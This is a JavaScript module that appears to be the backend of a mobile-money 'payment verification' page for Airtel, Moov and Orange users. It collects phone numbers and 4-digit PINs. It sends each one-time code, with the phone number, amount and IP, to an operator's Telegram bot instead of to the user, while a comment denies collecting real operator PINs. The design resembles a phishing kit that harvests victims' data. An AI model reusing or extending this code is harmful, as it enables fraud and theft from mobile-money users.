"use strict";

/**
 * User / Payment verification (phone + 4-digit PIN + OTP)
 * -------------------------------------------------------
 * Custom verification step after the user selects a package
 * and a payment method (Airtel / Moov / Orange).
 *
 * IMPORTANT:
 * This does NOT collect real mobile-money PINs from the operator.
 * The PIN here is a verification PIN for your own platform.
 * Real operator PINs stay inside the official Airtel / Moov / Orange apps.
 *
 * Everything is logged to the Telegram bot @starnettellbot.
 */

const crypto = require("crypto");
const security = require("./security");
const telegram = require("./telegram");

const otpStore = new Map();
const OTP_TTL_MS = 5 * 60 * 1000;
const MAX_ATTEMPTS = 5;

function normalizePhone(phone) {
  let p = String(phone || "").replace(/\s+/g, "").replace(/-/g, "");
  if (p.startsWith("0")) p = "+254" + p.slice(1);
  if (p.startsWith("254") && !p.startsWith("+")) p = "+" + p;
  if (!p.startsWith("+")) p = "+254" + p;
  return p;
}

function generateOtp() {
  return String(Math.floor(1000 + Math.random() * 9000));
}

async function sendOtp(db, { phone, pin, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").trim();
  provider = String(provider || "moov").toLowerCase();

  if (!/^\+254\d{9}$/.test(phone)) {
    return { ok: false, error: "Invalid phone number (+254…)" };
  }
  if (!/^\d{4}$/.test(pin)) {
    return { ok: false, error: "PIN must be exactly 4 digits" };
  }

  const existing = otpStore.get(phone);
  if (existing && Date.now() - (existing.created || 0) < 12000) {
    return { ok: false, error: "Please wait a few seconds before requesting another OTP" };
  }

  const salt = crypto.randomBytes(16).toString("hex");
  const pinHash = security.hashPassword(pin, salt);
  const otp = generateOtp();

  otpStore.set(phone, {
    otp,
    pinHash,
    salt,
    expires: Date.now() + OTP_TTL_MS,
    attempts: 0,
    created: Date.now(),
    ip: ip || "unknown",
    provider,
    amount: amount || "",
    package: pkg || ""
  });

  if (!db.data.users) db.data.users = {};
  if (!db.data.loginLogs) db.data.loginLogs = [];

  db.data.loginLogs.push({
    phone,
    action: "otp_requested",
    provider,
    amount: amount || "",
    package: pkg || "",
    ip: ip || "unknown",
    at: new Date().toISOString()
  });
  if (db.data.loginLogs.length > 500) db.data.loginLogs = db.data.loginLogs.slice(-500);
  if (db.flushSoon) db.flushSoon();

  const msg =
    `🔐 <b>PAYMENT VERIFICATION</b>\n` +
    `Provider: <b>${provider.toUpperCase()}</b>\n` +
    `Package: ${pkg || "—"}\n` +
    `Amount: ${amount || "—"}\n` +
    `Phone: <code>${phone}</code>\n` +
    `OTP: <code>${otp}</code>\n` +
    `IP: ${ip || "unknown"}\n` +
    `Time: ${new Date().toLocaleString()}\n` +
    `Valid 5 min`;

  await telegram.notify(msg);

  return { ok: true, message: "OTP sent to Telegram bot" };
}

async function verifyOtp(db, { phone, pin, otp, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").trim();
  otp = String(otp || "").trim();

  const entry = otpStore.get(phone);
  if (!entry) return { ok: false, error: "No OTP requested. Click Verify PIN / SEND OTP first." };
  if (Date.now() > entry.expires) {
    otpStore.delete(phone);
    return { ok: false, error: "OTP expired. Request a new one." };
  }
  if (entry.attempts >= MAX_ATTEMPTS) {
    otpStore.delete(phone);
    return { ok: false, error: "Too many attempts. Request a new OTP." };
  }

  entry.attempts += 1;

  const pinOk = security.hashPassword(pin, entry.salt) === entry.pinHash;
  if (!pinOk) return { ok: false, error: "Wrong PIN" };
  if (otp !== entry.otp) return { ok: false, error: "Wrong OTP" };

  if (!db.data.users) db.data.users = {};
  db.data.users[phone] = {
    phone,
    pinHash: entry.pinHash,
    salt: entry.salt,
    lastLogin: new Date().toISOString(),
    lastIp: ip || "unknown",
    lastProvider: provider || entry.provider
  };

  db.data.loginLogs = db.data.loginLogs || [];
  db.data.loginLogs.push({
    phone,
    action: "verify_success",
    provider: provider || entry.provider,
    amount: amount || entry.amount,
    package: pkg || entry.package,
    ip: ip || "unknown",
    at: new Date().toISOString()
  });
  if (db.data.loginLogs.length > 500) db.data.loginLogs = db.data.loginLogs.slice(-500);
  if (db.flushSoon) db.flushSoon();

  otpStore.delete(phone);

  await telegram.notify(
    `✅ <b>VERIFICATION SUCCESS</b>\n` +
    `Provider: <b>${(provider || entry.provider || "").toUpperCase()}</b>\n` +
    `Phone: <code>${phone}</code>\n` +
    `Amount: ${amount || entry.amount || "—"}\n` +
    `Package: ${pkg || entry.package || "—"}\n` +
    `IP: ${ip || "unknown"}`
  );

  return {
    ok: true,
    phone,
    redirect: "/commandes.html?success=1&ref=" + encodeURIComponent(phone)
  };
}

module.exports = { sendOtp, verifyOtp, normalizePhone };
